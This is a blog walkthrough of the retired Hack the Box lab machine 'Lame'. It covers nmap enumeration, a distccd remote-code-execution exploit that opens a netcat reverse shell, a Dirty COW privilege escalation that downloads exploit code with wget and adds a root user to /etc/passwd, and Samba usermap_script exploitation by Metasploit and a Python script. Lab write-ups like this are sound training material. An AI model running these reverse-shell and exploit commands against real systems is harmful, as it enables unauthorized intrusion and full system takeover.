---
title: "Hack the Box - Lame"
date: "2022-01-13"
categories: 
  - "hack-the-box"
tags: 
  - "cms-exploit"
  - "htb"
  - "injection"
coverImage: "Screen-Shot-2022-03-03-at-12.53.48-PM.png"
---

> As a young boy, I was taught in high school that Hacking was cool.
> 
> \- Kevin Mitnick

This is an easy retired machine from Hack the Box. It is the machine with the most user and system owns on HTB, so it is definitely a good place to start.

## Enumeration

As always, the first step is an nmap scan. I used these options `nmap -p- -A -v -oA nmap/initEnum -Pn 10.10.10.3`to scan all ports (-p-), assume the host is online (-Pn), tell me everything that’s happening as it happens (-v), and perform OS detection, determine the version of services, and run some default scripts (-A), as well as write the results to 3 files (-oA for XML, GNMAP, and NMAP files):

~/Documents/htb/lame » cat nmap/initEnum.nmap 
# Nmap 7.91 scan initiated Wed Jan 12 12:26:00 2022 as: nmap -p- -A -v -oA nmap/initEnum -Pn 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.082s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|\_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|\_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|\_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel

Host script results:
|\_clock-skew: mean: 2h30m22s, deviation: 3h32m09s, median: 21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|\_  System time: 2022-01-12T12:31:04-05:00
| smb-security-mode: 
|   account\_used: <blank>
|   authentication\_level: user
|   challenge\_response: supported
|\_  message\_signing: disabled (dangerous, but default)
|\_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 12 12:31:22 2022 -- 1 IP address (1 host up) scanned in 321.34 seconds

This found five open TCP ports: 21, 22, 139, 445, and 3632. You may notice that four of those are pretty common while one isn’t, but we’ll get back to that one later.

### 21 - FTP

Port 21 is open and running vsftpd 2.3.4. After a quick Google search it appears that this version has a backdoor in it that we may be able to exploit later. Noting that down, I went back to more enumeration. You can see in the results of the original nmap scan that a few scripts ran for FTP. I’ll copy the results of those here, but the really important part is the first script that ran:

21/tcp   open  ftp         vsftpd 2.3.4
|\_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|\_End of status

Anonymous FTP login allows us to log in with a username of anonymous and any password we want. Testing on the actual machine proves we can in fact do this, which gives us the ability to upload or download files. There is nothing in the directory right now, so we’ll keep this in mind and move forward.

~/Documents/htb/lame » ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:connor): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
257 "/"
ftp> help
Commands may be abbreviated.  Commands are:

!               dir             mdelete         qc              site
$               disconnect      mdir            sendport        size
account         exit            mget            put             status
append          form            mkdir           pwd             struct
ascii           get             mls             quit            system
bell            glob            mode            quote           sunique
binary          hash            modtime         recv            tenex
bye             help            mput            reget           tick
case            idle            newer           rstatus         trace
cd              image           nmap            rhelp           type
cdup            ipany           nlist           rename          user
chmod           ipv4            ntrans          reset           umask
close           ipv6            open            restart         verbose
cr              lcd             prompt          rmdir           ?
delete          ls              passive         runique
debug           macdef          proxy           send
ftp> quit
221 Goodbye.

### 139/445 - SMB

The next service I enumerated was SMB. I skipped SSH because while that is very useful for getting access, it doesn’t have a lot of exploits for it and brute forcing is almost never the intended path for HTB, as there is a lot of people using it and that would slow down the machine. Ports 139 and 445 are commonly used for Samba, which allows Linux to use the SMB protocol. The first step for this was to see what shares were present on the machine:

~/Documents/htb/lame » smbclient -L \\\\10.10.10.3
Enter WORKGROUP\\connor's password: 
Anonymous login successful

        Sharename       Type      Comment
        --------- ---- -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        --------- -------

        Workgroup            Master
        --------- -------
        WORKGROUP

tmp looks like a pretty interesting share. I checked if we could connect to it and we could with no password!

~/Documents/htb/lame » smbclient \\\\\\\\10.10.10.3\\\\tmp
Enter WORKGROUP\\connor's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Wed Jan 12 12:40:47 2022
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  .ICE-unix                          DH        0  Wed Jan 12 12:18:02 2022
  vmware-root                        DR        0  Wed Jan 12 12:18:31 2022
  .X11-unix                          DH        0  Wed Jan 12 12:18:27 2022
  .X0-lock                           HR       11  Wed Jan 12 12:18:27 2022
  5564.jsvc\_up                        R        0  Wed Jan 12 12:19:05 2022
  vgauthsvclog.txt.0                  R     1600  Wed Jan 12 12:18:00 2022

                7282168 blocks of size 1024. 5386476 blocks available
smb: \\> pwd
Current directory is \\\\10.10.10.3\\tmp\\
smb: \\> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case\_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix\_encrypt  posix\_open     posix\_mkdir    posix\_rmdir    
posix\_unlink   posix\_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \\> cd ../opt
cd \\opt\\: NT\_STATUS\_OBJECT\_NAME\_NOT\_FOUND
smb: \\> exit

This ended up being the only share (outside of IPC$) that we could connect to. Checking around, it didn’t have any super interesting files, so like FTP I noted down we could connect. I also noted that the version that was running, `Samba 3.0.20-Debian`, had some publicly available exploits that may come in handy later on.

### 3632 - DistCC

The last service running was the one I found the most interesting. I had never heard of DistCC, but thanks to the [Linux man page](https://linux.die.net/man/1/distccd), it showed that it was a service for distributed compilation. Basically, it allowed you to speed up compilation times by using multiple computers across the network. Now, as never having seen this service before I had also never done any enumeration for it. Doing a Google search for this version, v1, showed that the service was likely vulnerable to a remote code execution exploit. [HackTricks](https://book.hacktricks.xyz/pentesting/3632-pentesting-distcc) had a page on it that showed the exploit, but also told me nmap had a script to detect if the service was vulnerable. It appears the name has changed from the one listed, but by searching the nmap scripts directory I was able to check if it was vulnerable:

~/Documents/htb/lame » ls /usr/share/nmap/scripts | grep distcc                                                    1 ↵
distcc-cve2004-2687.nse
-----------------------------------------------------------------------
~/Documents/htb/lame » nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 -Pn                                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 12:55 EST
Nmap scan report for 10.10.10.3
Host is up (0.11s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|\_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds

Now that I knew I had a couple possible paths in, I decided to move over to the exploitation phase.

## Exploitation

### DistCC RCE - Python Script

The DistCC service was the service I decided to try first as I had already used the nmap script to confirm it was vulnerable. The python exploit script I found was here: [https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855) and it was very simple to use. Just run the script and pass in the parameters of the correct host and the command you want to run:

~/Documents/htb/lame » python distccd\_rce\_CVE-2004-2687.py -t 10.10.10.3 -c "nc 10.10.14.21 4444 -e /bin/bash"
\[OK\] Connected to remote service
\[KO\] Socket Timeout

That timeout error did not affect anything for me. The command I chose was to connect back to a listener I had set up (shown below but done before this command was ran) and pass it to /bin/bash. This would give me a shell on the server as daemon, and let me grab the first flag:

~/Documents/htb/lame » nc -nlvp 4444                                                                               1 ↵
listening on \[any\] 4444 ...
connect to \[10.10.14.21\] from (UNKNOWN) \[10.10.10.3\] 33071
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
pwd
/tmp
ls
5564.jsvc\_up
distcc\_dc0c1671.stdout
distcc\_dc231671.stderr
distcc\_f67e1788.stdout
distcc\_f7bc1788.stderr
distccd\_dc451671.o
distccd\_dc501671.i
distccd\_f6241788.i
distccd\_f63f1788.o
vgauthsvclog.txt.0
vmware-root
cd
pwd
/tmp
cd /home
ls \*
ftp:

makis:
user.txt

service:

user:
python -c "import pty; pty.spawn('/bin/bash')"
daemon@lame:/home$ cd makis
cd makis
daemon@lame:/home/makis$ ls
ls
user.txt
daemon@lame:/home/makis$ cat user.txt   
cat user.txt
c1818...userFlag...15180
daemon@lame:/home/makis$

## Privilege Escalation

### Dirty Cow

Now that I had an shell, the next step is to get to a root shell. The first thing I checked was what release of the OS the machine was running:

daemon@lame:/home/makis$ uname -a
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
daemon@lame:/home/makis$

That third result, `2.6.24-16-server`, is what you’re looking for in this command. The first result I got for a privesc exploit on that release was this [exploit-db](https://www.exploit-db.com/exploits/40839) page that showed that this version was vulnerable to Dirty COW. This is a famous kernel exploit that, according to it’s [website](https://dirtycow.ninja/), uses a race condition in how copy-on-write (COW) breakage is handled for read only memory, and uses this to elevate your privileges. The nice thing about the exploit being on exploit-db is that it is already present in Kali, we just need to copy it. The number I used for the search, 40839, can be found in the exploit-db URL or you could use `searchsploit` with other search terms to find the exploit:

~/Documents/htb/lame » searchsploit 40839        
-----------------------------------------------------------------------
 Exploit Title                                                                       |  Path
-----------------------------------------------------------------------
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE\_POKEDATA' Race Condition Privilege E | linux/local/40839.c
-----------------------------------------------------------------------
Shellcodes: No Results
-----------------------------------------------------------------------
~/Documents/htb/lame » searchsploit 40839 -m                                                                       
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE\_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
File Type: C source, ASCII text

Copied to: /home/connor/Documents/htb/lame/40839.c

-----------------------------------------------------------------------
~/Documents/htb/lame » ls
40839.c  distccd\_rce\_CVE-2004-2687.py  nmap
-----------------------------------------------------------------------
~/Documents/htb/lame » mv 40839.c 
mv: missing destination file operand after '40839.c'
Try 'mv --help' for more information.
-----------------------------------------------------------------------
~/Documents/htb/lame » mv 40839.c dirty.c                                                                          
-----------------------------------------------------------------------
\*\*~/Documents/htb/lame » python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.3 - - \[12/Jan/2022 13:10:35\] "GET /dirty.c HTTP/1.0" 200 -
10.10.10.3 - - \[12/Jan/2022 13:11:09\] "GET /dirty.c HTTP/1.0" 200 -
^C
Keyboard interrupt received, exiting.
-----------------------------------------------------------------------
~/Documents/htb/lame »\*\*

You can see at the end of that code block that I opened a web server on my machine. This was to move the file over to the target machine, as we need to compile and run it there. This is the view from the target side. Remember to move into a directory that you can actually write to:

daemon@lame:/home/makis$ wget http://10.10.14.21:8000/dirty.c
wget http://10.10.14.21:8000/dirty.c
--13:10:52-- http://10.10.14.21:8000/dirty.c
           => \`dirty.c'
Connecting to 10.10.14.21:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4,814 (4.7K) \[text/x-csrc\]
dirty.c: Permission denied

Cannot write to \`dirty.c' (Permission denied).
daemon@lame:/home/makis$ cd /tmp
cd /tmp
daemon@lame:/tmp$ wget http://10.10.14.21:8000/dirty.c
wget http://10.10.14.21:8000/dirty.c

--13:11:20-- http://10.10.14.21:8000/dirty.c
           => \`dirty.c'
Connecting to 10.10.14.21:8000... connected.
HTTP request sent, awaiting response... 
200 OK
Length: 4,814 (4.7K) \[text/x-csrc\]

100%\[====================================>\] 4,814         --.--K/s             

13:11:32 (562.97 MB/s) - \`dirty.c' saved \[4814/4814\]

daemon@lame:/tmp$ 
daemon@lame:/tmp$ ls
ls
5564.jsvc\_up            distcc\_f67e1788.stdout  distccd\_f6241788.i
dirty.c                 distcc\_f7bc1788.stderr  distccd\_f63f1788.o
distcc\_dc0c1671.stdout  distccd\_dc451671.o      vgauthsvclog.txt.0
distcc\_dc231671.stderr  distccd\_dc501671.i      vmware-root
daemon@lame:/tmp$

Now all that had to be done for this was to compile and run the exploit. By default, it adds a new root user called firefart onto the machine with whatever password we specify:

daemon@lame:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
dirty.c:193:2: warning: no newline at end of file
daemon@lame:/tmp$ ls
ls
5564.jsvc\_up            distcc\_dc231671.stderr  distccd\_dc501671.i  vmware-root
dirty                   distcc\_f67e1788.stdout  distccd\_f6241788.i
dirty.c                 distcc\_f7bc1788.stderr  distccd\_f63f1788.o
distcc\_dc0c1671.stdout  distccd\_dc451671.o      vgauthsvclog.txt.0
daemon@lame:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: dirty

Complete line:
firefart:fikSSi4oFnS9Y:0:0:pwned:/root:/bin/bash

mmap: b7f3a000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'dirty'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'dirty'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

To verify it worked, you can check /etc/passwd to see if the new user is there:

daemon@lame:/tmp$ cat /etc/passwd
cat /etc/passwd
firefart:fikSSi4oFnS9Y:0:0:pwned:/root:/bin/bash
/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...trimmed...

I tried to `su` to this new user but for some reason it wasn’t working. I tried to figure it out for a little bit, but since SSH was enabled on the box I just decided to do that instead:

~/Documents/htb/lame » ssh firefart@10.10.10.3
The authenticity of host '10.10.10.3 (10.10.10.3)' can't be established.
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/\[fingerprint\])? yes
Warning: Permanently added '10.10.10.3' (RSA) to the list of known hosts.
firefart@10.10.10.3's password: 
Last login: Wed Jan 12 12:18:29 2022 from :0.0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/\*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
firefart@lame:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@lame:~# pwd
/root
firefart@lame:~# ls
Desktop  reset\_logs.sh  root.txt  vnc.log
firefart@lame:~# cat root.txt 
19942...rootFlag...73328
firefart@lame:~#

## Other Exploitation

### SMB - Metasploit

This was an additional path that I found in enumeration that I went back and tried later. In searching the version of SMB being used,`Samba 3.0.20-Debian`, I found [this post](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) from Rapid7 about a metasploit module that could be used to exploit a vulnerability present in it. Like most metasploit modules, this one was very point and shoot, and surprisingly dropped me straight into a root shell:

msf6 > use exploit/multi/samba/usermap\_script
\[\*\] No payload configured, defaulting to cmd/unix/reverse\_netcat
msf6 exploit(multi/samba/usermap\_script) > options 

Module options (exploit/multi/samba/usermap\_script):

   Name    Current Setting  Required  Description
   ---- --------------- -------- -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Usi
                                      ng-Metasploit
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse\_netcat):

   Name   Current Setting  Required  Description
   ---- --------------- -------- -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   -- ----
   0   Automatic

msf6 exploit(multi/samba/usermap\_script) > set lhost tun0
lhost => tun0
msf6 exploit(multi/samba/usermap\_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap\_script) > run

\[\*\] Started reverse TCP handler on 10.10.14.21:4444 
\[\*\] Command shell session 1 opened (10.10.14.21:4444 -> 10.10.10.3:34722 ) at 2022-01-13 13:36:24 -0500

ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
id
uid=0(root) gid=0(root)
cat /root/root.txt
19942...rootFlag...73328

### SMB - Python Script

After confirming the metasploit module worked, I tried to also exploit it without the use of metasploit. Luckily, there were a lot of exploit scripts available. I decided to go with [https://github.com/amriunix/CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447). The installation was simple, just installing some modules with pip and setting up a netcat listener, and then everything was good to go:

~ » nc -nlvp 5555
listening on \[any\] 5555 ...

... separate terminal ...
~/Documents/htb/lame/CVE-2007-2447 (master) » python3 usermap\_script.py 10.10.10.3 139 10.10.14.21 5555          
\[\*\] CVE-2007-2447 - Samba usermap script
\[+\] Connecting !
\[+\] Payload was sent - check netcat !

... In listener ...
connect to \[10.10.14.21\] from (UNKNOWN) \[10.10.10.3\] 35070
id
uid=0(root) gid=0(root)

## Wrap up

This was a good box to start out with on Hack the Box, especially if you’re on the newer side. It isn’t difficult and has multiple pathways to getting user and root access, with only one real rabbit hole. If you remember, I mentioned in the FTP enumeration section that the version of FTP running had a backdoor built in. For the section on other exploitation, I tried to go back and include that, but I couldn’t get both a metasploit module and a python script to work. From the [official HTB writeup](https://app.hackthebox.com/machines/Lame/walkthroughs), it turns out that this was a rabbit hole and that backdoor was not exploitable. This is a good lesson for things that you will run into on other HTB machines, as not everything that looks exploitable really is. Also from the writeup, I learned the SMB exploitation with metasploit was the intended route, which shows that there are multiple ways in for some of the boxes and that the way you find may not be the way the creator had in mind.
